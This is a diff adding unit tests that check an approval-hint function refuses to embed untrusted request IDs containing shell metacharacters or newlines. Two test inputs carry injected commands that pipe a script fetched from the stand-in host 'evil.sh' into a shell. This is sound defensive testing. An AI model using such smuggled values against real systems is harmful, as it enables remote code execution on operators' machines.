@@ -50,3 +50,31 @@ test('surrounding whitespace in a real id is trimmed before embedding', () => {
   const hint = pendingApprovalHint(' req-42 ');
   expect(hint).toContain('node gate/cli.mjs pair approve req-42\n');
 });
+
+test('a requestId carrying shell metacharacters is never embedded', () => {
+  // The id comes off the wire from an unverified gateway and lands in a
+  // command a human pastes into their Gate machine. A hostile gateway must
+  // not be able to author that command — anything outside plain id
+  // characters falls back to the always-safe pair-list walk.
+  const hint = pendingApprovalHint('req; curl evil.sh | sh');
+  expect(hint).toContain('node gate/cli.mjs pair list');
+  expect(hint).toContain('pair approve <requestId>');
+  expect(hint).not.toContain('curl');
+});
+
+test('a newline cannot smuggle a second line into the copy-paste block', () => {
+  // Multi-line payloads are the realistic attack: the hint renders as a code
+  // block, so a \n inside the id would render an extra plausible-looking
+  // command line right under the approve command.
+  const hint = pendingApprovalHint('req-42\ncurl evil.sh | sh');
+  expect(hint).toContain('node gate/cli.mjs pair list');
+  expect(hint).not.toContain('curl');
+  expect(hint.split('\n')).toHaveLength(9); // exact pair-list shape, nothing appended
+});
+
+test('slug ids with dots and underscores still name the exact command', () => {
+  // The allowlist must not reject legitimate non-UUID slugs real gates emit.
+  const hint = pendingApprovalHint('req_42.v2');
+  expect(hint).toContain('node gate/cli.mjs pair approve req_42.v2\n');
+  expect(hint).not.toContain('<requestId>');
+});
